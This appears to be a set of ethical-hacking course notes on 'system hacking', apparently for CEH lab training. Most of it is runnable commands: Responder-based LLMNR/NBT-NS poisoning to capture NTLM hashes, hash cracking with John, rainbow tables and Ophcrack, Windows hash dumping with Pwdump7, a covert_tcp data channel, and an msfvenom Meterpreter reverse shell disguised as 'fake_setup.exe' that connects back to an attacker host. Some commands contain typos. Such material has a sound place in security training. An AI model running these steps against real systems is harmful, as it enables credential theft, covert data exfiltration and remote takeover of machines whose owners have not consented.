# 6 - System Hacking

## Module 06 - System Hacking



### LLMNR / NBT-NS Spoofing

[Responder](https://github.com/lgandx/Responder) : rogue authentication server to capture hashes

This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present [Step by Step](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)

```
# In Parrot/Kali OS, 
responder -I eth0

# In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
# To crack that hash, use JohntheRipper
john SMB<filename>
```

###

###

### **NTLM Hash crack**

* esponder -I eth0
* usr\share\responder\logs --> Responder log location
* john /usr/share/responder/logs/ntlm.txt

### **Rainbow table crack using Winrtgen**

* Open winrtgen and add new table
* Select ntlm from Hash dropdown list.
* Set Min Len as 4, Max Len as 6 and Chain Count 4000000
* Select loweralpha from Charset dropdown list (it depends upon Password).
* rcrack\_gui.exe to crack hash with rainbow table

### **Hash dump with Pwdump7 and crack with Ophcrack**

* `wmic useraccount get name,sid` --> Get user acc names and SID
* PwDump7.exe > c:\hashes.txt&#x20;
* Replace boxes in hashes.txt with relevant usernames from step 1.
* Ophcrack.exe -> load -> PWDUMP File
* Tables -> Vista free -> select the table directory -> crack

{% embed url="https://www.tarasco.org/security/pwdump_7/pwdump7.zip" %}
pwDump7.exe : To Dump Windows Hashes
{% endembed %}

{% embed url="http://project-rainbowcrack.com/" %}
rcrack\_gui.exe : Use Raindow Table to crack hashes
{% endembed %}

{% embed url="https://ophcrack.sourceforge.io/download.php?type=ophcrack" %}
Ophcrack.exe : To Crack SAM Hashes to obtain clear password
{% endembed %}

### **Perform Active Online Attack to Crack the System's Password using Responder**

#### **Linux:**

* cd
* cd Responder
* chmox +x ./Responder.py
* **sudo ./Responder.py -I eth0**
* passwd: \*\*\*\*

#### **Windows**

* run
* \CEH-Tools

#### **Linux:**

* Home/Responder/logs/SMB-NTMLv2-SSP-**\<Target IP>**txt
* sudo snap install john-the-ripper
* passwd: \*\*\*\*
* **sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt**

### **Covert Channels using Covert\_TCP**

#### **Attacker:**

* cd Desktop
* mkdir Send
* cd Send
* echo "Secret"->message.txt
* Place->Network
* Ctrl+L
* **smb://\<Target IP>**
* Account & Password
* copy and paste covert\_tcp.c
* **cc -o covert\_tcp covert\_tcp.c**

#### **Target:**

* **tcpdump -nvvx port 8888 -I lo**
* cd Desktop
* mkdir Receive
* cd Receive
* File->Ctrl+L
* smb://**\<Target IP>**
* copy and paste covert\_tcp.c
* cc -o covert\_tcp covert\_tcp.c
* **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 9999 -dest\_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
* **Tcpdump captures no packets**

#### **Attacker**

* **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/attacker/Desktop/send/message.txt**
* Wireshark (message string being send in individual packet)

### Create a Reverse TCP Connection

```bash
# creates reverse TCP from windows  machine, send this file to victim machine via python-Webserver/shared resource
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attacker_IP> LPORT=444 -o fake_setup.exe  ↵

msfdb init && msfconsole ↵
use exploit/multi/handler ↵
set LHOST=<attacker-IP>  ↵
set LPORT=444 ↵
  run
```
